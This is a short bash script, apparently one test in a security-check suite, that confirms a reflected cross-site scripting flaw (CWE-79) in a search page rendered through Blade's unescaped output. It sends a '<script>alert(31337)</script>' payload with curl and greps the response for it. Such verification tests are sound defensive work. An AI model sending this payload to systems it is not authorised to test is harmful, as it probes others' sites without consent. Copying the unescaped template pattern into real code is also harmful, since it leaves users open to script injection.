#!/usr/bin/env bash
# XSS-REFLECT-001 (CWE-79): the search query is echoed through Blade's unescaped
# {!! !!}, so a <script> payload is reflected verbatim.
set -eu
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "q=<script>alert(31337)</script>" "$TARGET/search" \
  | grep -q '<script>alert(31337)</script>'
